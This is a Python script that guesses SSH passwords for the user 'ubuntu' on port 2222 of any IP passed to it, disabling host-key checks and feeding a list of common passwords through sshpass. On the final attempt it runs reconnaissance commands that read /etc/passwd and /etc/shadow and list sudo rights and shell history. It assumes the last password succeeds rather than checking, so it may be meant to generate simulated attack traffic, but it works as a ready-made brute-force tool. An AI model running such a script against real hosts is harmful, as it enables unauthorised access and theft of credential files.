import subprocess
import time
import sys

TARGET_IP = sys.argv[1]
PORT = 2222
USERNAME = "ubuntu"

PASSWORDS = [
    "letmein", "qwerty", "pass123", "welcome",
    "monkey", "dragon", "master", "sunshine",
    "princess", "shadow",
    "ubuntu"
]

COMMANDS = [
    "whoami", "id", "uname -a", "hostname",
    "cat /etc/passwd", "ls", "ls -la", "pwd",
    "cd /etc", "ls", "cd /tmp", "ls",
    "netstat", "ifconfig", "ps aux",
    "cat /etc/shadow", "sudo -l", "history"
]

def attempt(ip, port, username, password, run_commands=False):
    print(f"[*] Trying {username}:{password}")

    ssh_opts = [
        "sshpass", "-p", password, "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=8",
        "-o", "PreferredAuthentications=password",
        "-o", "PubkeyAuthentication=no",
        "-p", str(port),
        f"{username}@{ip}"
    ]

    if not run_commands:
        subprocess.run(
            ssh_opts,
            capture_output=True, text=True, timeout=15
        )
        print(f"[-] Failed: {username}:{password}")
        return

    for cmd in COMMANDS:
        subprocess.run(
            ssh_opts + [cmd],
            capture_output=True, text=True, timeout=15
        )
        print(f"[+] {username}:{password} | ran: {cmd}")
        time.sleep(0.5)

if __name__ == "__main__":
    for i, password in enumerate(PASSWORDS):
        is_last = (i == len(PASSWORDS) - 1)
        attempt(TARGET_IP, PORT, USERNAME, password, run_commands=is_last)
        time.sleep(1)
